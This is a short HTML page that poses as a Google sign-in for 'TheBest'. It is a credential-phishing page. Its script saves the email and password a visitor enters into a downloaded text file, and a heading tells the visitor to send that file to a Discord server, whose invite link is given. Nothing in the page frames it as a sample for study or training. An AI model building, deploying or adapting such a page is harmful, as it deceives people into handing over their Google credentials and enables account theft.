<html lang="sk"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to TheBest</title>
    <script>
        function downloadCredentials() {
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            const blob = new Blob([`Email: ${email}\nHeslo: ${password}`], { type: 'text/plain' });
            const link = document.createElement('a');
            link.href = window.URL.createObjectURL(blob);
            link.download = 'success.goog';
            link.click();
        }
    </script>
</head>
<body>
    <h1>Log in with Google: Enter your Google Email and Password</h1>
    <h1>CAUTION: After you Log In and Download the File Send it to a Discord Server: https://discord.gg/Qzf4e27HdR</h1>
    <form onsubmit="event.preventDefault(); downloadCredentials();">
        <label for="email">Email:</label>
        <input type="email" id="email" required="">
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" required="">
        <br>
        <button type="submit">Done</button>
    </form>


</body></html>
